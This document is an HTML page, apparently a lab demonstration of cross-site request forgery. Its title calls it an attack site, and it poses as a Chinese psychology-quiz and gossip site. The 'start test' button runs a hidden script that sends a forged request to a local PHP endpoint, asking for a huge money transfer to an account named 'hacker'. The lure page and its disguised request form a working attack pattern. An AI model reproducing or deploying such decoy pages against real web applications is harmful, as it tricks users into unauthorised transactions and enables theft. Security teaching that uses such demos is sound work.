<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
    <style>
        .navbar{
            background-color:black;
        }
        .navbar a{
            font-size:30px;
            color:white;
            
        }
        .navbar a:hover{
            background-color: yellow;
        }
        .carousel-inner img{
            width:1300px;
            height:400px;
        }

    </style>
    <title>攻擊網站</title>
</head>
<body>
<nav class="navbar navbar-expand-lg  ">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">心理測驗</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="#">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">關於我們</a>
        </li>
        
      </ul>
      <form class="d-flex">
        <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
        <button class="btn btn-outline-success" type="submit">搜尋</button>
      </form>
    </div>
  </div>
</nav>    
<div id="carouselExampleIndicators" class="carousel slide" data-bs-ride="carousel">
  <div class="carousel-indicators">
    <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
    <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="1" aria-label="Slide 2"></button>
    <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="2" aria-label="Slide 3"></button>
  </div>
  <div class="carousel-inner">
    <div class="carousel-item active">
      <img src="pic2.jpg" class="d-block w-100" alt="pic2">
    </div>
    <div class="carousel-item">
      <img src="pic3.jpg" class="d-block w-100" alt="pic3">
    </div>
    <div class="carousel-item">
      <img src="pic4.jpg" class="d-block w-100" alt="pic4">
    </div>
  </div>
  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Previous</span>
  </button>
  <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Next</span>
  </button>
</div>
<div class="container">
    <div class="row">
        <div class="col-12 col-md-3">
            <div class="list-group" style="margin:50px 10px;">
            <a href="#" class="list-group-item list-group-item-action active" aria-current="true">
                前往首頁
            </a>
            <a href="#" class="list-group-item list-group-item-action">本日熱點</a>
            <a href="#" class="list-group-item list-group-item-action">八卦</a>
            <a href="#" class="list-group-item list-group-item-action">娛樂</a>
            <a class="list-group-item list-group-item-action disabled">新聞</a>
            </div>
        </div>
                <div class="col-12 col-md-9">
                    <div class="row">
                        <div class="card" style="width: 500px; hight:500px; margin:50px 10px;">
                        <img src="pic5.jpg" class="card-img-top" alt="pic3" width="">
                        <div class="card-body">
                        <h5 class="card-title">測驗你心中的正能量指數</h5>
            
                        <a href='#' onclick='GetRequest()' class="btn btn-primary">開始測驗</a>
                    </div>
                </div>
        </div>
    </div>
</div>

    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    
    <script>
        function GetRequest() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://127.0.0.1/index3.php?admin=a&money=1000000000000&accout=hacker', true);
            xhr.send();
        }
    </script>

</body>
</html>